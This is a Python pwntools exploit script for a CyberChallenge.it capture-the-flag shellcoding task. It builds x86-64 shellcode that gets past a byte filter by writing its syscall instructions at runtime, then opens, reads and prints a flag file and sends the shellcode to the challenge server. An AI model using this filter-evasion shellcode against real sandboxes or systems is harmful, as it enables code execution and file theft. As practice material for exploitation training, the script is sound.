#!/usr/bin/env python3

from pwn import *


HOST = "shellcoder.challs.cyberchallenge.it"
PORT = 38201
MAX_SIZE = 0x200

TRAPS = [
    b"\x0f\x05",
    b"\x0f\x34",
    b"\xcd\x80",
    b"\x6d\x6d",
    b"\x61\x70",
    b"\x20\x66",
]


def passes_filter(shellcode: bytes) -> bool:
    for index in range(len(shellcode) - 1):
        if shellcode[index:index + 2] in TRAPS:
            return False
    return True


def build_flag_shellcode() -> bytes:
    context.clear(arch="amd64", os="linux")
    asm_code = r"""
        lea r14, [rip+sc1]
        mov byte ptr [r14], 0x0f
        mov byte ptr [r14+1], 0x04
        inc byte ptr [r14+1]

        lea r14, [rip+sc2]
        mov byte ptr [r14], 0x0f
        mov byte ptr [r14+1], 0x04
        inc byte ptr [r14+1]

        lea r14, [rip+sc3]
        mov byte ptr [r14], 0x0f
        mov byte ptr [r14+1], 0x04
        inc byte ptr [r14+1]

        lea r14, [rip+sc4]
        mov byte ptr [r14], 0x0f
        mov byte ptr [r14+1], 0x04
        inc byte ptr [r14+1]

        xor r13d, r13d
    try_open:
        cmp r13d, 0
        je use_path1
        jmp use_path2

    use_path1:
        mov rdi, -100
        lea rsi, [rip+path1]
        xor edx, edx
        xor r10d, r10d
        mov eax, 257
        jmp sc1

    use_path2:
        mov rdi, -100
        lea rsi, [rip+path2]
        xor edx, edx
        xor r10d, r10d
        mov eax, 257
        jmp sc1

    after_sc1:
        test eax, eax
        jns opened
        inc r13d
        cmp r13d, 2
        jl try_open
        jmp do_exit

    opened:
        mov r12, rax

        mov rdi, r12
        lea rsi, [rip+buf]
        mov edx, 0x80
        xor eax, eax
        jmp sc2

    after_sc2:
        test eax, eax
        jle do_exit
        mov edx, eax
        mov edi, 1
        lea rsi, [rip+buf]
        mov eax, 1
        jmp sc3

    after_sc3:
    do_exit:
        xor edi, edi
        mov eax, 60
        jmp sc4

    sc1:
        nop
        nop
        jmp after_sc1

    sc2:
        nop
        nop
        jmp after_sc2

    sc3:
        nop
        nop
        jmp after_sc3

    sc4:
        nop
        nop
        ud2

    path1:
        .ascii "/flag\x00"
    path2:
        .ascii "./flag\x00"
    buf:
        .fill 0x80, 1, 0x41
    """
    return asm(asm_code)


def main() -> None:
    shellcode = build_flag_shellcode()
    print(f"[INFO] shellcode_len={len(shellcode)}")

    if len(shellcode) > MAX_SIZE:
        raise SystemExit(f"[ERROR] shellcode troppo grande: {len(shellcode)} > {MAX_SIZE}")

    if not passes_filter(shellcode):
        raise SystemExit("[ERROR] shellcode bloccata dal filtro locale TRAPS")

    connection = remote(HOST, PORT)
    connection.recvuntil(b"How many bytes?\n")
    connection.sendline(str(len(shellcode)).encode())
    connection.recvuntil(b"Shellcode:\n")
    connection.send(shellcode)

    response = connection.recvrepeat(3).replace(b"\x00", b"")
    text = response.decode(errors="replace")
    print(text)

    if "CCIT{" in text:
        print("[SUCCESS] flag trovata")
    else:
        print("[INFO] nessuna flag trovata in questa esecuzione")

    connection.close()


if __name__ == "__main__":
    main()
